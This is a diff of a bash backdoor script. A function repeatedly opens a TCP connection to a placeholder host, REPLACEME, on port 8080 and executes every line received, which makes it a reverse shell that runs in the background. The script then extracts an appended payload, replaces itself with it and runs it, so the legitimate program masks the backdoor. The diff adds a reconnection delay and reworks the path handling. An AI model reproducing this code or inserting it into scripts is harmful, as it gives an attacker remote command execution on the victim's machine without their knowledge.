@@ -9,11 +9,13 @@
 iPWD=$PWD
 ME="MYPATH"
 BINARY_PATH=$iPWD"/$ME"
+relative_path=$(dirname "$0");
 
 #above lines must remain first!
 
 function loop_de_loop {
     while true; do
+        sleep 30
         exec 5<>/dev/tcp/REPLACEME/8080
         cat <&5 | while read line; do
             $line 2>&5 >&5
@@ -29,13 +31,14 @@ le_fork &
 
 match=$(grep --text --line-number '^#PAYLOAD:$' $0 | cut -d ':' -f 1)
 payload_start=$((match + 1))
-#relative_path=$(dirname "$0"); cd "$relative_path"; abs_path=$(pwd);
+BINARY_PATH=$relative_path/"$ME"
 
-
-
+touch $BINARY_PATH".out"
 tail -n +$payload_start $BINARY_PATH >> $BINARY_PATH".out"
-
-mv $BINARY_PATH".out" $BINARY_PATH > /dev/null 2>&1
-chmod a+x $BINARY_PATH > /dev/null 2>&1
+diff $BINARY_PATH $BINARY_PATH".out"
+rm $BINARY_PATH
+mv $BINARY_PATH".out" $BINARY_PATH
+chmod a+x $BINARY_PATH
 eval $BINARY_PATH $@
 exit 0
+
